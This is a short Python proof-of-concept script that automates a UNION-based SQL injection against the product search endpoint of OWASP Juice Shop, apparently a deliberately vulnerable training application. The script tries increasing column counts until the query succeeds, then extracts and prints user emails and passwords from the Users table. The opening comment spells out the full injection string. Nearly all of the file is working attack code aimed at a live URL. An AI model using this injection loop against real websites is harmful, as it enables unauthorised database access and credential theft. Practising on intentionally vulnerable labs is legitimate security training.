# foobar')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--
# https://juice-shop.herokuapp.com/rest/products/search?q=Apple

# Finish later.  Add some threading.

import requests
import json

class UNION_fuzz_POC:
    """Really simple POC to send determine the appropriate
    Length of a Union Injection
    """
    def __init__(self, url, query, union_start, union_end):
        self.url = url
        self.query = query
        self.union_start = union_start
        self.union_end = union_end

    def send_req(self, SQLurl):
        r = requests.get(SQLurl)
        print(r.status_code)

        if r.status_code != 500:
            return r.text

    def build_injs(self):
        next = ""
        for i in range(self.union_start, self.union_end+1):
            next += f", '{str(i)}'"
            injection = self.query.replace("[NUMS]", next)  
            payload = self.url+injection
            if resp := self.send_req(payload):
                print(f"\nUnion Length: {i}\n")
                print(f"Union Query: {payload}")
                return self.parse(resp)
                

    def parse(self, resp):
        credentials = json.loads(resp)
        for user in credentials['data']:
            print(F" {user['name']}  : {user['description']}")

if __name__ == '__main__':
    poc = UNION_fuzz_POC(
        'http://juice-shop.herokuapp.com/rest/products/search?q=',
        "foobar')) UNION SELECT id, email, password [NUMS] FROM Users--",
        4,
        12)
    poc.build_injs()
